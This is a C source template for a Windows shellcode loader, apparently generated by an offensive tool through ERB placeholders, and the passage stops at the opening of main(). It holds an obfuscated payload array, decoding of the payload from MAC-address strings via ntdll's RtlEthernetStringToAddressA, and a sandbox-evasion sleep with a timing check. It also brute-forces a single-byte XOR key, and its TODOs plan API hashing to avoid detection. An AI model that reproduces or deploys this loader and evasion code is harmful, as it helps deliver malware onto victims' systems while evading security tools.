#include <Windows.h>
#include <stdio.h>

#define SCSIZE <%= encrypted_payload_length %>
#define SCSIZE_DECODED <%= encrypted_payload_length*6 %>

char bDecodedPayload[SCSIZE_DECODED];
char * bPayload[SCSIZE] = { <%= encrypted_payload.to_s.gsub!(']', '').gsub!('[', '') %> };
char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";

typedef union _LARGE_INTEGER {
    struct {
        DWORD LowPart;
        LONG HighPart;
    } DUMMYSTRUCTNAME;
    struct {
        DWORD LowPart;
        LONG HighPart;
    } u;
    __int64 QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;

typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
);
typedef NTSTATUS(__stdcall* fnRtlEthernetStringToAddressA)(
    PCSTR		S,
    PCSTR* Terminator,
    PVOID		Addr
    );

void  *memset(void *b, int c, int len)
{
  int           i;
  unsigned char *p = b;
  i = 0;
  while(len > 0)
    {
      *p = c;
      p++;
      len--;
    }
  return(b);
}

void DecodePayload()
{
    PCSTR terminator = NULL;
    memset(bDecodedPayload, 0, SCSIZE_DECODED);
    PBYTE tmp = (PBYTE)(&bDecodedPayload);

    //TODO: API hashing here pls
    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlEthernetStringToAddressA");

    for (int i = 0; i != SCSIZE ; i+=1) {
        fncMacDeobfuscate(bPayload[i], &terminator, (LPCSTR)tmp);
        tmp = (PBYTE)(tmp + 6);
    }

}

int DelayExecution()
{
    // Converting minutes to milliseconds - TODO: add random interval 
    DWORD               dwMilliSeconds = 12000;
    LARGE_INTEGER       DelayInterval = { 0 };
    __int64             Delay = NULL;
    NTSTATUS            STATUS = NULL;

    // TODO: add API hashing
    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
    DWORD               _T0 = NULL, _T1 = NULL;

    // Converting from milliseconds to the 100-nanosecond - negative time interval
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    _T0 = GetTickCount();
    
    
    // Sleeping for 'dwMilliSeconds' ms 
    if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 ) {
        return 0;
    }

    _T1 = GetTickCount();
     
    if((_T1 - _T0) < dwMilliSeconds) {
        return 0;
    }

    return 1;
}

char GetKey(char control_byte)
{
	char hardcoded = bDecodedPayload[0];
	for (int i = 0; i <= 255; i++)
	{
		char res = i ^ hardcoded;
                if (res == (char)(control_byte)) 
			return (char)i;
	}
        }

        void DecryptPayload(char control_byte)
        {
                char key = GetKey(control_byte);
                for (int i = 0; i < SCSIZE; i++)
                {
                        bDecodedPayload[i] = bDecodedPayload[i] ^ key;
                }
        }

void main() {
